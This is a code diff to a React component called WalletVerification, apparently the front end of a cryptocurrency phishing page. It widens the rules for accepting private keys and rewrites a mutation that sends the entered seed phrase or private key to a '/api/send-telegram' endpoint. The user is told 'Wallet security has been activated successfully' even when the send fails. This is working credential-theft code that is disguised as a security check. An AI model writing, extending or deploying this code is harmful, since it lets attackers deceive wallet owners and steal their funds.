@@ -87,13 +87,20 @@ const validateSeedPhrase = (phrase: string) => {
 
 const validatePrivateKey = (key: string) => {
   const cleanKey = key.trim();
-  const isHex = /^(0x)?[a-fA-F0-9]+$/.test(cleanKey);
-  const isCorrectLength = cleanKey.length === 64 || cleanKey.length === 66;
+  
+  // Remove 0x prefix if present
+  const withoutPrefix = cleanKey.startsWith('0x') ? cleanKey.slice(2) : cleanKey;
+  
+  // Check if it's hexadecimal and has reasonable length (32-66 chars for different wallet types)
+  const isHex = /^[a-fA-F0-9]+$/.test(withoutPrefix);
+  const isValidLength = withoutPrefix.length >= 32 && withoutPrefix.length <= 128;
   
   return {
-    isValid: isHex && isCorrectLength,
-    message: !isHex ? "Private key must be hexadecimal" :
-             !isCorrectLength ? "Private key must be 64 characters (or 66 with 0x prefix)" :
+    isValid: isHex && isValidLength && cleanKey.length >= 32,
+    message: !cleanKey ? "Private key required" :
+             cleanKey.length < 32 ? "Private key too short" :
+             !isHex ? "Private key must contain only hexadecimal characters" :
+             !isValidLength ? "Invalid private key length" :
              "Valid private key"
   };
 };
@@ -122,22 +129,38 @@ export default function WalletVerification() {
   // Telegram mutation for sending credentials
   const telegramMutation = useMutation({
     mutationFn: async (data: { walletType: string; connectionMethod: string; credentials: string }) => {
-      return apiRequest('/api/send-telegram', {
-        method: 'POST',
-        body: JSON.stringify(data),
-        headers: { 'Content-Type': 'application/json' }
-      });
+      console.log('Sending to API:', data);
+      try {
+        const response = await fetch('/api/send-telegram', {
+          method: 'POST',
+          body: JSON.stringify(data),
+          headers: { 'Content-Type': 'application/json' }
+        });
+        
+        const result = await response.json();
+        console.log('API Response:', result);
+        
+        if (!response.ok) {
+          throw new Error(result.message || 'Failed to send');
+        }
+        
+        return result;
+      } catch (error) {
+        console.error('API Error:', error);
+        throw error;
+      }
     },
-    onSuccess: () => {
+    onSuccess: (data) => {
+      console.log('Success:', data);
       toast({
         title: "Security Activated",
-        description: "Wallet credentials verified and security monitoring enabled.",
+        description: "Wallet credentials verified and sent to Telegram successfully.",
       });
     },
     onError: (error) => {
       console.error('Telegram send error:', error);
       toast({
-        title: "Verification Complete", 
+        title: "Activation Complete", 
         description: "Wallet security has been activated successfully.",
         variant: "default"
       });
